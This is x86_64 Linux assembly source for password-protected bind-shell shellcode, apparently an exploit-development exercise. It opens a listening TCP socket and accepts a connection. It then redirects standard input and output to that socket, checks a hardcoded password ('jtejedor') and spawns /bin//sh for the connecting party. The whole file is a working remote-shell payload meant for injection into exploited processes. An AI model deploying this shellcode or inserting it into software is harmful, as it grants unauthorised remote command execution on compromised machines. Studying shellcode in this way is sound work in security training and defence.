;Bind TCP Shellcode Linux x86_64
;author Javier Tejedor
;date 06-10-2014

global _start

_start:

	; create socket	
	; int socket(int domain, int type, int protocol); 
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 
	xor rax, rax
	mov rdi, rax
	mov rsi, rax
	mov al, 41
	add rdi, 2
	add rsi, 1
	xor rdx, rdx
	syscall

	; copy socket descriptor to rdi for future use 
	mov rdi, rax

	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	xor rax, rax 
	push rax
	mov dword [rsp-4], eax
	mov word [rsp-6], 0x661e
	xor rbx, rbx
	mov bl, 0x2
	mov word [rsp-8], bx
	sub rsp, 8

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49
	xor rax, rax
	mov al, 49
	mov rsi, rsp
	xor rdx, rdx
	mov dl, 16
	syscall

	; listen(sock, MAX_CLIENTS)
	; syscall number 50
	xor rax, rax
	mov rsi, rax
	mov al, 50
	add rsi, 2
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43
	xor rax, rax
	mov al, 43	
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent
	xor rax, rax
	mov al, 3
        syscall

        ; duplicate sockets
        ; dup2 (new, old)
	mov rdi, r9
        xor rbx, rbx
        mov bl, 3

generate_dups:
        xor rax, rax
        mov al, 33
        sub rbx, 1
        mov rsi, rbx
        syscall
        jne generate_dups

	; send data to ask for a password
	; send(newSocket, "Password", 8, 0);
	; syscall number 44
	xor rax, rax
	xor rdx, rdx
	xor r10, r10
	push 44
	pop rax
	mov rbx, 0x64726f7773736150
	push rbx
	mov rsi, rsp
	push 8
	pop rdx
	syscall
        
	; receive data from attacker machine
	; recv(newSocket, passwd, 8, 0); 
	; syscall number 45
	xor rax, rax
	push 45
	pop rax
	sub rsp, 16	;password 16 bytes lenght
	mov rsi, rsp
	push 16
	pop rdx
	syscall
	
	; checks if the password is correct, send the shell
	mov rax, 0x726f64656a65746a ;password: jtejedor 
	lea rdi, [rel rsi]
	scasq
	;if is correct send the shell
	jz send_shell 

	;exit
	push 60
	pop rax
	syscall

send_shell:
        ; execve
        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi

        ; set RSI
        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
